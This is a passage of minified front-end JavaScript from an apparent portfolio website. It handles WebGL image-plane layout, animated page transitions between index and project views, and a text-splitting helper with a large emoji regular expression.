				var e = void 0 !== t ? t : 0 === this.planes.length,
					i = this.UIDIndexes[this.currentUID || this._getDefaultUID()],
					n = mo._getMedia(fs.currentProject);
				$s(this.media), Xs(this.media, n);
				var r = mo._getBounds(n),
					s = i * (mo.BOUNDS_WIDTH_MOBILE + mo.BOUNDS_GAP_X_MOBILE);
				r.forEach((function(t) {
					t.x += -s
				})), this._getProperBounds = mo._getBounds;
				var o = this._getIndexPlanes();
				if (!e) {
					var a = this.planes[0],
						u = r[i];
					cs.to(a, {
						scrollX: 0,
						scrollY: 0,
						ease: "smooth_1",
						duration: .7
					}), cs.to(a.bound, {
						x: u.x,
						y: u.y,
						width: u.width,
						ratio: u.ratio,
						ease: "smooth_1",
						duration: .7,
						onUpdate: function() {
							a._resize()
						}
					})
				}
				$s(this.planes), Xs(this.planes, o);
				for (var h = 0; h < this.planes.length; h++) this.planes[h]._lazy && !this.planes[h]._loaded && this.planes[h]._lazyLoad(), e ? (this.planes[h]._updateBound(r[h]), this.planes[h].bound.x += 1) : e || h === i || (this.planes[h]._updateBound(r[h]), this.planes[h]._resize());
				if (this._hydrateAllPlanes(), this._togglePlaneImageProperties(this.planes, ["inview", "inviewActive"], [!0, !0, !0]), e) this._animateToNextBounds(r, !1, "start");
				else {
					if (this._toggleVisibilityPlanes(this.planes, !0), i > 0) {
						var l = this.planes[i - 1],
							c = l.bound.x + l.bound.width;
						cs.from(l.bound, {
							x: "+=" + -c,
							ease: "smooth_1",
							duration: .7,
							onUpdate: function() {
								l._resize()
							}
						})
					}
					if (i < this.planes.length - 1) {
						var d = this.planes[i + 1],
							p = d.bound.x;
						cs.from(d.bound, {
							x: "+=" + (1 - p),
							ease: "smooth_1",
							duration: .7,
							onUpdate: function() {
								d._resize()
							}
						})
					}
				}
				this.planes[i]._playVideo()
			}
		}, {
			key: "_onScroll",
			value: function(t) {
				for (var e = this.planes.length, i = 0; i < e; i++) this.planes[i].scrollX = t, this.planes[i]._updatePosition()
			}
		}, {
			key: "_resize",
			value: function() {
				if (this._getProperBounds) {
					var t = this._getProperBounds(this.media),
						e = 0;
					"index" === ea.Router.properties.slug && (e = this.UIDIndexes[this.currentUID] * (mo.BOUNDS_WIDTH_MOBILE + mo.BOUNDS_GAP_X_MOBILE));
					for (var i = 0; i < this.planes.length; i++) this.planes[i]._updateBound(t[i]), this.planes[i].bound.x += -e, this.planes[i]._resize();
					this.scroller.resize()
				}
			}
		}]), i
	}(go);
	var _o = new(function(t) {
		d()(i, t);
		var e = function(t) {
			var e = function() {
				if ("undefined" == typeof Reflect || !Reflect.construct) return !1;
				if (Reflect.construct.sham) return !1;
				if ("function" == typeof Proxy) return !0;
				try {
					return Boolean.prototype.valueOf.call(Reflect.construct(Boolean, [], (function() {}))), !0
				} catch (t) {
					return !1
				}
			}();
			return function() {
				var i, n = g()(t);
				if (e) {
					var r = g()(this).constructor;
					i = Reflect.construct(n, arguments, r)
				} else i = n.apply(this, arguments);
				return f()(this, i)
			}
		}(i);

		function i() {
			var t;
			return r()(this, i), (t = e.call(this)).viewport = {
				width: 0,
				height: 0
			}, window.WEBGL = u()(t), t
		}
		return o()(i, [{
			key: "onResize",
			value: function() {
				if (!this.paused) {
					l()(g()(i.prototype), "onResize", this).call(this);
					var t = this.camera.fov * (Math.PI / 180),
						e = 2 * Math.tan(t / 2) * this.camera.position.z,
						n = e * this.camera.aspect;
					for (var r in this.viewport.height = e, this.viewport.width = n, this.entities) this.entities[r]._resize()
				}
			}
		}, {
			key: "onUpdate",
			value: function(t, e) {
				for (var i in this.entities) this.entities[i]._update(t, e)
			}
		}, {
			key: "initScene",
			value: function() {
				for (var t in this.entities = {
						planes: fs.IS_MOBILE ? new vo : new go
					}, this.entities) this.entities[t]._build(), this.scene.addChild(this.entities[t])
			}
		}]), i
	}(Ms));
	var Do = function(t) {
		d()(i, t);
		var e = function(t) {
			var e = function() {
				if ("undefined" == typeof Reflect || !Reflect.construct) return !1;
				if (Reflect.construct.sham) return !1;
				if ("function" == typeof Proxy) return !0;
				try {
					return Boolean.prototype.valueOf.call(Reflect.construct(Boolean, [], (function() {}))), !0
				} catch (t) {
					return !1
				}
			}();
			return function() {
				var i, n = g()(t);
				if (e) {
					var r = g()(this).constructor;
					i = Reflect.construct(n, arguments, r)
				} else i = n.apply(this, arguments);
				return f()(this, i)
			}
		}(i);

		function i() {
			return r()(this, i), e.apply(this, arguments)
		}
		return o()(i, [{
			key: "in",
			value: function(t) {
				var e = t.from,
					i = t.to,
					n = t.done;
				ps.emit("TRANSITION_IN", i.dataset.routerView, e.dataset.routerView), e.remove(), cs.from(i, {
					opacity: 0,
					onComplete: n,
					duration: .2
				})
			}
		}, {
			key: "out",
			value: function(t) {
				var e = t.from,
					i = t.done;
				cs.to(e, {
					opacity: 0,
					onComplete: i,
					duration: .2
				})
			}
		}]), i
	}(js.Transition);
	var yo = function(t) {
		d()(i, t);
		var e = function(t) {
			var e = function() {
				if ("undefined" == typeof Reflect || !Reflect.construct) return !1;
				if (Reflect.construct.sham) return !1;
				if ("function" == typeof Proxy) return !0;
				try {
					return Boolean.prototype.valueOf.call(Reflect.construct(Boolean, [], (function() {}))), !0
				} catch (t) {
					return !1
				}
			}();
			return function() {
				var i, n = g()(t);
				if (e) {
					var r = g()(this).constructor;
					i = Reflect.construct(n, arguments, r)
				} else i = n.apply(this, arguments);
				return f()(this, i)
			}
		}(i);

		function i() {
			return r()(this, i), e.apply(this, arguments)
		}
		return o()(i, [{
			key: "in",
			value: function(t) {
				var e = t.from,
					i = t.to,
					n = t.done;
				e.remove();
				var r = Array.from(i.querySelectorAll(".js__index-section")),
					s = fs.currentProject ? r.find((function(t) {
						return t.dataset.uid === fs.currentProject
					})) : r[0],
					o = s.querySelectorAll(".page-index__section-bottom .b-line-item"),
					a = Array.from(i.querySelectorAll(".page-index__slider-slide")),
					u = i.querySelector(".page-index__slider-bar"),
					h = s.querySelectorAll(".page-index__section-title .b-line-item"),
					l = a.findIndex((function(t) {
						return t.dataset.uid === fs.currentProject
					})),
					c = Zs(a),
					d = fs.IS_MOBILE ? c[Math.min(2, l)] : c[l];
				u.style.transform = "translateX(".concat(d, "px)"), u.style.transitionDuration = "700ms, 0s";
				var p = i.querySelectorAll(".page-index__slider-nav-btn"),
					f = i.querySelector(".page-index__slider-scroll-container");
				fs.IS_MOBILE && l > 2 && cs.to(f, {
					x: "+=" + -(l - 2) * (fs.SLIDER_MOBILE_THUMB_WIDTH + fs.SLIDER_MOBILE_THUMB_GAP),
					ease: "none",
					duration: 0
				});
				for (var m = 0; m < r.length; m++) r[m] !== s && (r[m].style.display = "none");
				var g = cs.timeline({
					onComplete: n
				});
				g.from(o, {
					y: "-100%",
					ease: "smooth_1",
					duration: .7
				}), g.from(h, {
					y: "-100%",
					stagger: .05,
					ease: "smooth_1",
					duration: .7
				}, 0), g.from(a, {
					opacity: 0,
					x: "+=" + fs.WINDOW_WIDTH / 8,
					stagger: .05,
					ease: "smooth_1",
					duration: .7
				}, 0), g.from(u, {
					opacity: 0,
					ease: "smooth_1",
					duration: .7
				}, "<"), g.from(p, {
					opacity: 0,
					ease: "smooth_1",
					duration: .7
				}, 0)
			}
		}, {
			key: "out",
			value: function(t) {
				var e = t.from,
					i = t.done,
					n = /project/.test(ea.Router.location.pathname),
					r = (fs.currentProject ? e.querySelector('.js__index-section[data-uid="'.concat(fs.currentProject, '"]')) : e.querySelector(".js__index-section:first-child")).querySelectorAll(".b-line-item"),
					s = e.querySelectorAll(".page-index__slider-slide, .page-index__slider-bar"),
					o = e.querySelectorAll(".page-index__slider-nav-btn");
				s[0].style.transition = "none";
				var a = cs.timeline({
					onComplete: i,
					delay: n ? 0 : .7,
					onStart: function() {
						n && ps.emit(Ds, e.dataset.routerView, ea.Router.location.pathname.split("/").pop())
					}
				});
				n || ps.emit(ws, a), a.to(r, {
					y: "-100%",
					ease: "smooth_1",
					duration: .7
				}, 0), a.to(s, {
					opacity: 0,
					stagger: .05,
					ease: "smooth_1",
					duration: .35
				}, 0), a.to(s, {
					stagger: .05,
					x: "+=" + fs.WINDOW_WIDTH / -8,
					ease: "power3.inOut",
					duration: .35
				}, 0), a.to(o, {
					opacity: 0,
					ease: "smooth_1",
					duration: .35
				}, 0)
			}
		}]), i
	}(js.Transition);
	var xo, wo, Eo, bo = function(t) {
			d()(i, t);
			var e = function(t) {
				var e = function() {
					if ("undefined" == typeof Reflect || !Reflect.construct) return !1;
					if (Reflect.construct.sham) return !1;
					if ("function" == typeof Proxy) return !0;
					try {
						return Boolean.prototype.valueOf.call(Reflect.construct(Boolean, [], (function() {}))), !0
					} catch (t) {
						return !1
					}
				}();
				return function() {
					var i, n = g()(t);
					if (e) {
						var r = g()(this).constructor;
						i = Reflect.construct(n, arguments, r)
					} else i = n.apply(this, arguments);
					return f()(this, i)
				}
			}(i);

			function i() {
				var t;
				r()(this, i);
				for (var n = arguments.length, s = new Array(n), o = 0; o < n; o++) s[o] = arguments[o];
				return (t = e.call.apply(e, [this].concat(s)))._splittedOverview = null, t
			}
			return o()(i, [{
				key: "_showSplitedOverview",
				value: function(t) {
					return cs.fromTo(t, {
						y: 100
					}, {
						y: 0,
						stagger: .1,
						duration: .7,
						ease: "smooth_1"
					})
				}
			}, {
				key: "in",
				value: function(t) {
					var e = t.from,
						i = t.to,
						n = t.done;
					document.body.style.backgroundColor = i.dataset.darkerColor;
					var r = i.querySelectorAll(".page-project__info .b-line-item, .page-project__overview .b-line-item, .page-project__link .b-line-item"),
						s = i.querySelector(".page-project__nav"),
						o = i.querySelectorAll(".page-project__nav-link"),
						a = i.querySelectorAll(".page-project__title .b-line-item");
					s.style.pointerEvents = "none", this._splittedOverview || (this._splittedOverview = new ro({
						target: i.querySelector(".page-project__overview-text")
					})), e.remove();
					var u = cs.timeline({
						onComplete: function() {
							s.style.pointerEvents = "", n()
						}
					});
					u.from(r, {
						y: "100%",
						ease: "smooth_1",
						duration: .7
					}, 0), u.from(a, {
						y: "100%",
						stagger: .1,
						ease: "smooth_1",
						duration: .7
					}, 0), u.add(this._showSplitedOverview(this._splittedOverview.dom.lines), 0), u.add((function() {
						fs.dom.navBarLogoBL.classList.add("top"), fs.dom.navBarOpenerBL.classList.add("top")
					}), 0), u.from(o, {
						y: "100%",
						ease: "smooth_1",
						duration: .35
					}, "<.35")
				}
			}, {
				key: "out",
				value: function(t) {
					var e = t.from,
						i = t.done,
						n = "/" === ea.Router.location.pathname ? "index" : /project/.test(ea.Router.location.pathname) ? "project" : null;
					ps.emit(ys, n, (function() {
						if (/project/.test(ea.Router.location.pathname)) {
							var t = ea.Router.location.pathname.split("/").pop();
							ps.emit(Ds, "project", t)
						} else "/" === ea.Router.location.pathname && ps.emit(xs)
					})), document.body.style.backgroundColor = "";
					var r = e.querySelectorAll(".b-line-item"),
						s = (e.querySelector(".page-project__nav"), e.querySelectorAll(".page-project__nav-link")),
						o = cs.timeline({
							onComplete: i
						});
					o.to(r, {
						y: "-100%",
						ease: "smooth_1",
						duration: .7
					}, 0), o.to(this._splittedOverview.dom.lines, {
						y: -100,
						stagger: .1,
						ease: "smooth_1"
					}, 0), o.to(s, {
						y: "-100%",
						ease: "smooth_1",
						duration: .7
					}, 0), "project" !== n && o.add((function() {
						fs.dom.navBarLogoBL.classList.remove("top"), fs.dom.navBarOpenerBL.classList.remove("top")
					}), "<.35")
				}
			}]), i
		}(js.Transition),
		Co = i(8),
		To = i.n(Co),
		Fo = /([\uD800-\uDBFF][\uDC00-\uDFFF](?:[\u200D\uFE0F][\uD800-\uDBFF][\uDC00-\uDFFF]){2,}|\uD83D\uDC69(?:\u200D(?:(?:\uD83D\uDC69\u200D)?\uD83D\uDC67|(?:\uD83D\uDC69\u200D)?\uD83D\uDC66)|\uD83C[\uDFFB-\uDFFF])|\uD83D\uDC69\u200D(?:\uD83D\uDC69\u200D)?\uD83D\uDC66\u200D\uD83D\uDC66|\uD83D\uDC69\u200D(?:\uD83D\uDC69\u200D)?\uD83D\uDC67\u200D(?:\uD83D[\uDC66\uDC67])|\uD83C\uDFF3\uFE0F\u200D\uD83C\uDF08|(?:\uD83C[\uDFC3\uDFC4\uDFCA]|\uD83D[\uDC6E\uDC71\uDC73\uDC77\uDC81\uDC82\uDC86\uDC87\uDE45-\uDE47\uDE4B\uDE4D\uDE4E\uDEA3\uDEB4-\uDEB6]|\uD83E[\uDD26\uDD37-\uDD39\uDD3D\uDD3E\uDDD6-\uDDDD])(?:\uD83C[\uDFFB-\uDFFF])\u200D[\u2640\u2642]\uFE0F|\uD83D\uDC69(?:\uD83C[\uDFFB-\uDFFF])\u200D(?:\uD83C[\uDF3E\uDF73\uDF93\uDFA4\uDFA8\uDFEB\uDFED]|\uD83D[\uDCBB\uDCBC\uDD27\uDD2C\uDE80\uDE92])|(?:\uD83C[\uDFC3\uDFC4\uDFCA]|\uD83D[\uDC6E\uDC6F\uDC71\uDC73\uDC77\uDC81\uDC82\uDC86\uDC87\uDE45-\uDE47\uDE4B\uDE4D\uDE4E\uDEA3\uDEB4-\uDEB6]|\uD83E[\uDD26\uDD37-\uDD39\uDD3C-\uDD3E\uDDD6-\uDDDF])\u200D[\u2640\u2642]\uFE0F|\uD83C\uDDFD\uD83C\uDDF0|\uD83C\uDDF6\uD83C\uDDE6|\uD83C\uDDF4\uD83C\uDDF2|\uD83C\uDDE9(?:\uD83C[\uDDEA\uDDEC\uDDEF\uDDF0\uDDF2\uDDF4\uDDFF])|\uD83C\uDDF7(?:\uD83C[\uDDEA\uDDF4\uDDF8\uDDFA\uDDFC])|\uD83C\uDDE8(?:\uD83C[\uDDE6\uDDE8\uDDE9\uDDEB-\uDDEE\uDDF0-\uDDF5\uDDF7\uDDFA-\uDDFF])|(?:\u26F9|\uD83C[\uDFCB\uDFCC]|\uD83D\uDD75)(?:\uFE0F\u200D[\u2640\u2642]|(?:\uD83C[\uDFFB-\uDFFF])\u200D[\u2640\u2642])\uFE0F|(?:\uD83D\uDC41\uFE0F\u200D\uD83D\uDDE8|\uD83D\uDC69(?:\uD83C[\uDFFB-\uDFFF])\u200D[\u2695\u2696\u2708]|\uD83D\uDC69\u200D[\u2695\u2696\u2708]|\uD83D\uDC68(?:(?:\uD83C[\uDFFB-\uDFFF])\u200D[\u2695\u2696\u2708]|\u200D[\u2695\u2696\u2708]))\uFE0F|\uD83C\uDDF2(?:\uD83C[\uDDE6\uDDE8-\uDDED\uDDF0-\uDDFF])|\uD83D\uDC69\u200D(?:\uD83C[\uDF3E\uDF73\uDF93\uDFA4\uDFA8\uDFEB\uDFED]|\uD83D[\uDCBB\uDCBC\uDD27\uDD2C\uDE80\uDE92]|\u2764\uFE0F\u200D(?:\uD83D\uDC8B\u200D(?:\uD83D[\uDC68\uDC69])|\uD83D[\uDC68\uDC69]))|\uD83C\uDDF1(?:\uD83C[\uDDE6-\uDDE8\uDDEE\uDDF0\uDDF7-\uDDFB\uDDFE])|\uD83C\uDDEF(?:\uD83C[\uDDEA\uDDF2\uDDF4\uDDF5])|\uD83C\uDDED(?:\uD83C[\uDDF0\uDDF2\uDDF3\uDDF7\uDDF9\uDDFA])|\uD83C\uDDEB(?:\uD83C[\uDDEE-\uDDF0\uDDF2\uDDF4\uDDF7])|[#\*0-9]\uFE0F\u20E3|\uD83C\uDDE7(?:\uD83C[\uDDE6\uDDE7\uDDE9-\uDDEF\uDDF1-\uDDF4\uDDF6-\uDDF9\uDDFB\uDDFC\uDDFE\uDDFF])|\uD83C\uDDE6(?:\uD83C[\uDDE8-\uDDEC\uDDEE\uDDF1\uDDF2\uDDF4\uDDF6-\uDDFA\uDDFC\uDDFD\uDDFF])|\uD83C\uDDFF(?:\uD83C[\uDDE6\uDDF2\uDDFC])|\uD83C\uDDF5(?:\uD83C[\uDDE6\uDDEA-\uDDED\uDDF0-\uDDF3\uDDF7-\uDDF9\uDDFC\uDDFE])|\uD83C\uDDFB(?:\uD83C[\uDDE6\uDDE8\uDDEA\uDDEC\uDDEE\uDDF3\uDDFA])|\uD83C\uDDF3(?:\uD83C[\uDDE6\uDDE8\uDDEA-\uDDEC\uDDEE\uDDF1\uDDF4\uDDF5\uDDF7\uDDFA\uDDFF])|\uD83C\uDFF4\uDB40\uDC67\uDB40\uDC62(?:\uDB40\uDC77\uDB40\uDC6C\uDB40\uDC73|\uDB40\uDC73\uDB40\uDC63\uDB40\uDC74|\uDB40\uDC65\uDB40\uDC6E\uDB40\uDC67)\uDB40\uDC7F|\uD83D\uDC68(?:\u200D(?:\u2764\uFE0F\u200D(?:\uD83D\uDC8B\u200D)?\uD83D\uDC68|(?:(?:\uD83D[\uDC68\uDC69])\u200D)?\uD83D\uDC66\u200D\uD83D\uDC66|(?:(?:\uD83D[\uDC68\uDC69])\u200D)?\uD83D\uDC67\u200D(?:\uD83D[\uDC66\uDC67])|\uD83C[\uDF3E\uDF73\uDF93\uDFA4\uDFA8\uDFEB\uDFED]|\uD83D[\uDCBB\uDCBC\uDD27\uDD2C\uDE80\uDE92])|(?:\uD83C[\uDFFB-\uDFFF])\u200D(?:\uD83C[\uDF3E\uDF73\uDF93\uDFA4\uDFA8\uDFEB\uDFED]|\uD83D[\uDCBB\uDCBC\uDD27\uDD2C\uDE80\uDE92]))|\uD83C\uDDF8(?:\uD83C[\uDDE6-\uDDEA\uDDEC-\uDDF4\uDDF7-\uDDF9\uDDFB\uDDFD-\uDDFF])|\uD83C\uDDF0(?:\uD83C[\uDDEA\uDDEC-\uDDEE\uDDF2\uDDF3\uDDF5\uDDF7\uDDFC\uDDFE\uDDFF])|\uD83C\uDDFE(?:\uD83C[\uDDEA\uDDF9])|\uD83C\uDDEE(?:\uD83C[\uDDE8-\uDDEA\uDDF1-\uDDF4\uDDF6-\uDDF9])|\uD83C\uDDF9(?:\uD83C[\uDDE6\uDDE8\uDDE9\uDDEB-\uDDED\uDDEF-\uDDF4\uDDF7\uDDF9\uDDFB\uDDFC\uDDFF])|\uD83C\uDDEC(?:\uD83C[\uDDE6\uDDE7\uDDE9-\uDDEE\uDDF1-\uDDF3\uDDF5-\uDDFA\uDDFC\uDDFE])|\uD83C\uDDFA(?:\uD83C[\uDDE6\uDDEC\uDDF2\uDDF3\uDDF8\uDDFE\uDDFF])|\uD83C\uDDEA(?:\uD83C[\uDDE6\uDDE8\uDDEA\uDDEC\uDDED\uDDF7-\uDDFA])|\uD83C\uDDFC(?:\uD83C[\uDDEB\uDDF8])|(?:\u26F9|\uD83C[\uDFCB\uDFCC]|\uD83D\uDD75)(?:\uD83C[\uDFFB-\uDFFF])|(?:\uD83C[\uDFC3\uDFC4\uDFCA]|\uD83D[\uDC6E\uDC71\uDC73\uDC77\uDC81\uDC82\uDC86\uDC87\uDE45-\uDE47\uDE4B\uDE4D\uDE4E\uDEA3\uDEB4-\uDEB6]|\uD83E[\uDD26\uDD37-\uDD39\uDD3D\uDD3E\uDDD6-\uDDDD])(?:\uD83C[\uDFFB-\uDFFF])|(?:[\u261D\u270A-\u270D]|\uD83C[\uDF85\uDFC2\uDFC7]|\uD83D[\uDC42\uDC43\uDC46-\uDC50\uDC66\uDC67\uDC70\uDC72\uDC74-\uDC76\uDC78\uDC7C\uDC83\uDC85\uDCAA\uDD74\uDD7A\uDD90\uDD95\uDD96\uDE4C\uDE4F\uDEC0\uDECC]|\uD83E[\uDD18-\uDD1C\uDD1E\uDD1F\uDD30-\uDD36\uDDD1-\uDDD5])(?:\uD83C[\uDFFB-\uDFFF])|\uD83D\uDC68(?:\u200D(?:(?:(?:\uD83D[\uDC68\uDC69])\u200D)?\uD83D\uDC67|(?:(?:\uD83D[\uDC68\uDC69])\u200D)?\uD83D\uDC66)|\uD83C[\uDFFB-\uDFFF])|(?:[\u261D\u26F9\u270A-\u270D]|\uD83C[\uDF85\uDFC2-\uDFC4\uDFC7\uDFCA-\uDFCC]|\uD83D[\uDC42\uDC43\uDC46-\uDC50\uDC66-\uDC69\uDC6E\uDC70-\uDC78\uDC7C\uDC81-\uDC83\uDC85-\uDC87\uDCAA\uDD74\uDD75\uDD7A\uDD90\uDD95\uDD96\uDE45-\uDE47\uDE4B-\uDE4F\uDEA3\uDEB4-\uDEB6\uDEC0\uDECC]|\uD83E[\uDD18-\uDD1C\uDD1E\uDD1F\uDD26\uDD30-\uDD39\uDD3D\uDD3E\uDDD1-\uDDDD])(?:\uD83C[\uDFFB-\uDFFF])?|(?:[\u231A\u231B\u23E9-\u23EC\u23F0\u23F3\u25FD\u25FE\u2614\u2615\u2648-\u2653\u267F\u2693\u26A1\u26AA\u26AB\u26BD\u26BE\u26C4\u26C5\u26CE\u26D4\u26EA\u26F2\u26F3\u26F5\u26FA\u26FD\u2705\u270A\u270B\u2728\u274C\u274E\u2753-\u2755\u2757\u2795-\u2797\u27B0\u27BF\u2B1B\u2B1C\u2B50\u2B55]|\uD83C[\uDC04\uDCCF\uDD8E\uDD91-\uDD9A\uDDE6-\uDDFF\uDE01\uDE1A\uDE2F\uDE32-\uDE36\uDE38-\uDE3A\uDE50\uDE51\uDF00-\uDF20\uDF2D-\uDF35\uDF37-\uDF7C\uDF7E-\uDF93\uDFA0-\uDFCA\uDFCF-\uDFD3\uDFE0-\uDFF0\uDFF4\uDFF8-\uDFFF]|\uD83D[\uDC00-\uDC3E\uDC40\uDC42-\uDCFC\uDCFF-\uDD3D\uDD4B-\uDD4E\uDD50-\uDD67\uDD7A\uDD95\uDD96\uDDA4\uDDFB-\uDE4F\uDE80-\uDEC5\uDECC\uDED0-\uDED2\uDEEB\uDEEC\uDEF4-\uDEF8]|\uD83E[\uDD10-\uDD3A\uDD3C-\uDD3E\uDD40-\uDD45\uDD47-\uDD4C\uDD50-\uDD6B\uDD80-\uDD97\uDDC0\uDDD0-\uDDE6])|(?:[#\*0-9\xA9\xAE\u203C\u2049\u2122\u2139\u2194-\u2199\u21A9\u21AA\u231A\u231B\u2328\u23CF\u23E9-\u23F3\u23F8-\u23FA\u24C2\u25AA\u25AB\u25B6\u25C0\u25FB-\u25FE\u2600-\u2604\u260E\u2611\u2614\u2615\u2618\u261D\u2620\u2622\u2623\u2626\u262A\u262E\u262F\u2638-\u263A\u2640\u2642\u2648-\u2653\u2660\u2663\u2665\u2666\u2668\u267B\u267F\u2692-\u2697\u2699\u269B\u269C\u26A0\u26A1\u26AA\u26AB\u26B0\u26B1\u26BD\u26BE\u26C4\u26C5\u26C8\u26CE\u26CF\u26D1\u26D3\u26D4\u26E9\u26EA\u26F0-\u26F5\u26F7-\u26FA\u26FD\u2702\u2705\u2708-\u270D\u270F\u2712\u2714\u2716\u271D\u2721\u2728\u2733\u2734\u2744\u2747\u274C\u274E\u2753-\u2755\u2757\u2763\u2764\u2795-\u2797\u27A1\u27B0\u27BF\u2934\u2935\u2B05-\u2B07\u2B1B\u2B1C\u2B50\u2B55\u3030\u303D\u3297\u3299]|\uD83C[\uDC04\uDCCF\uDD70\uDD71\uDD7E\uDD7F\uDD8E\uDD91-\uDD9A\uDDE6-\uDDFF\uDE01\uDE02\uDE1A\uDE2F\uDE32-\uDE3A\uDE50\uDE51\uDF00-\uDF21\uDF24-\uDF93\uDF96\uDF97\uDF99-\uDF9B\uDF9E-\uDFF0\uDFF3-\uDFF5\uDFF7-\uDFFF]|\uD83D[\uDC00-\uDCFD\uDCFF-\uDD3D\uDD49-\uDD4E\uDD50-\uDD67\uDD6F\uDD70\uDD73-\uDD7A\uDD87\uDD8A-\uDD8D\uDD90\uDD95\uDD96\uDDA4\uDDA5\uDDA8\uDDB1\uDDB2\uDDBC\uDDC2-\uDDC4\uDDD1-\uDDD3\uDDDC-\uDDDE\uDDE1\uDDE3\uDDE8\uDDEF\uDDF3\uDDFA-\uDE4F\uDE80-\uDEC5\uDECB-\uDED2\uDEE0-\uDEE5\uDEE9\uDEEB\uDEEC\uDEF0\uDEF3-\uDEF8]|\uD83E[\uDD10-\uDD3A\uDD3C-\uDD3E\uDD40-\uDD45\uDD47-\uDD4C\uDD50-\uDD6B\uDD80-\uDD97\uDDC0\uDDD0-\uDDE6])\uFE0F)/,
		Mo = /(?:\r|\n|\t\t)/g,
		Ao = /(?:\s\s+)/g,
		So = function(t) {
			return wo.getComputedStyle(t)
		},
		Oo = Array.isArray,
		Po = [].slice,
		Io = function(t, e) {
			var i;
			return Oo(t) ? t : "string" === (i = To()(t)) && !e && t ? Po.call(xo.querySelectorAll(t), 0) : t && "object" === i && "length" in t ? Po.call(t, 0) : t ? [t] : []
		},
		Lo = function(t) {
			return "absolute" === t.position || !0 === t.absolute
		},
		Bo = function(t, e) {
			for (var i, n = e.length; --n > -1;)
				if (i = e[n], t.substr(0, i.length) === i) return i.length
		},
		ko = function(t, e) {
			void 0 === t && (t = "");
			var i = ~t.indexOf("++"),
				n = 1;
			return i && (t = t.split("++").join("")),
				function() {
					return "<" + e + " style='position:relative;display:inline-block;'" + (t ? " class='" + t + (i ? n++ : "") + "'>" : ">")
				}
		},
		Ro = function t(e, i, n) {
			var r = e.nodeType;
			if (1 === r || 9 === r || 11 === r)
				for (e = e.firstChild; e; e = e.nextSibling) t(e, i, n);
			else 3 !== r && 4 !== r || (e.nodeValue = e.nodeValue.split(i).join(n))
		},
		No = function(t, e) {
			for (var i = e.length; --i > -1;) t.push(e[i])
		},
		Wo = function(t, e, i) {
			for (var n; t && t !== e;) {
				if (n = t._next || t.nextSibling) return n.textContent.charAt(0) === i;
				t = t.parentNode || t._parent
			}
		},
		zo = function t(e) {
			var i, n, r = Io(e.childNodes),
				s = r.length;
			for (i = 0; i < s; i++)(n = r[i])._isSplit ? t(n) : (i && 3 === n.previousSibling.nodeType ? n.previousSibling.nodeValue += 3 === n.nodeType ? n.nodeValue : n.firstChild.nodeValue : 3 !== n.nodeType && e.insertBefore(n.firstChild, n), e.removeChild(n))
		},
		Uo = function(t, e) {
			return parseFloat(e[t]) || 0
		},
		jo = function(t, e, i, n, r, s, o) {
			var a, u, h, l, c, d, p, f, m, g, v, _, D = So(t),
				y = Uo("paddingLeft", D),
				x = -999,
				w = Uo("borderBottomWidth", D) + Uo("borderTopWidth", D),
				E = Uo("borderLeftWidth", D) + Uo("borderRightWidth", D),
				b = Uo("paddingTop", D) + Uo("paddingBottom", D),
				C = Uo("paddingLeft", D) + Uo("paddingRight", D),
				T = .2 * Uo("fontSize", D),
				F = D.textAlign,
				M = [],
				A = [],
				S = [],
				O = e.wordDelimiter || " ",
				P = e.tag ? e.tag : e.span ? "span" : "div",
				I = e.type || e.split || "chars,words,lines",
				L = r && ~I.indexOf("lines") ? [] : null,
				B = ~I.indexOf("words"),
				k = ~I.indexOf("chars"),
				R = Lo(e),
				N = e.linesClass,
				W = ~(N || "").indexOf("++"),
				z = [];
			for (W && (N = N.split("++").join("")), h = (u = t.getElementsByTagName("*")).length, c = [], a = 0; a < h; a++) c[a] = u[a];
			if (L || R)
				for (a = 0; a < h; a++)((d = (l = c[a]).parentNode === t) || R || k && !B) && (_ = l.offsetTop, L && d && Math.abs(_ - x) > T && ("BR" !== l.nodeName || 0 === a) && (p = [], L.push(p), x = _), R && (l._x = l.offsetLeft, l._y = _, l._w = l.offsetWidth, l._h = l.offsetHeight), L && ((l._isSplit && d || !k && d || B && d || !B && l.parentNode.parentNode === t && !l.parentNode._isSplit) && (p.push(l), l._x -= y, Wo(l, t, O) && (l._wordEnd = !0)), "BR" === l.nodeName && (l.nextSibling && "BR" === l.nextSibling.nodeName || 0 === a) && L.push([])));
			for (a = 0; a < h; a++) d = (l = c[a]).parentNode === t, "BR" !== l.nodeName ? (R && (m = l.style, B || d || (l._x += l.parentNode._x, l._y += l.parentNode._y), m.left = l._x + "px", m.top = l._y + "px", m.position = "absolute", m.display = "block", m.width = l._w + 1 + "px", m.height = l._h + "px"), !B && k ? l._isSplit ? (l._next = l.nextSibling, l.parentNode.appendChild(l)) : l.parentNode._isSplit ? (l._parent = l.parentNode, !l.previousSibling && l.firstChild && (l.firstChild._isFirst = !0), l.nextSibling && " " === l.nextSibling.textContent && !l.nextSibling.nextSibling && z.push(l.nextSibling), l._next = l.nextSibling && l.nextSibling._isFirst ? null : l.nextSibling, l.parentNode.removeChild(l), c.splice(a--, 1), h--) : d || (_ = !l.nextSibling && Wo(l.parentNode, t, O), l.parentNode._parent && l.parentNode._parent.appendChild(l), _ && l.parentNode.appendChild(xo.createTextNode(" ")), "span" === P && (l.style.display = "inline"), M.push(l)) : l.parentNode._isSplit && !l._isSplit && "" !== l.innerHTML ? A.push(l) : k && !l._isSplit && ("span" === P && (l.style.display = "inline"), M.push(l))) : L || R ? (l.parentNode && l.parentNode.removeChild(l), c.splice(a--, 1), h--) : B || t.appendChild(l);
			for (a = z.length; --a > -1;) z[a].parentNode.removeChild(z[a]);
			if (L) {
				for (R && (g = xo.createElement(P), t.appendChild(g), v = g.offsetWidth + "px", _ = g.offsetParent === t ? 0 : t.offsetLeft, t.removeChild(g)), m = t.style.cssText, t.style.cssText = "display:none;"; t.firstChild;) t.removeChild(t.firstChild);
				for (f = " " === O && (!R || !B && !k), a = 0; a < L.length; a++) {
					for (p = L[a], (g = xo.createElement(P)).style.cssText = "display:block;text-align:" + F + ";position:" + (R ? "absolute;" : "relative;"), N && (g.className = N + (W ? a + 1 : "")), S.push(g), h = p.length, u = 0; u < h; u++) "BR" !== p[u].nodeName && (l = p[u], g.appendChild(l), f && l._wordEnd && g.appendChild(xo.createTextNode(" ")), R && (0 === u && (g.style.top = l._y + "px", g.style.left = y + _ + "px"), l.style.top = "0px", _ && (l.style.left = l._x - _ + "px")));
					0 === h ? g.innerHTML = "&nbsp;" : B || k || (zo(g), Ro(g, String.fromCharCode(160), " ")), R && (g.style.width = v, g.style.height = l._h + "px"), t.appendChild(g)
				}
				t.style.cssText = m
			}
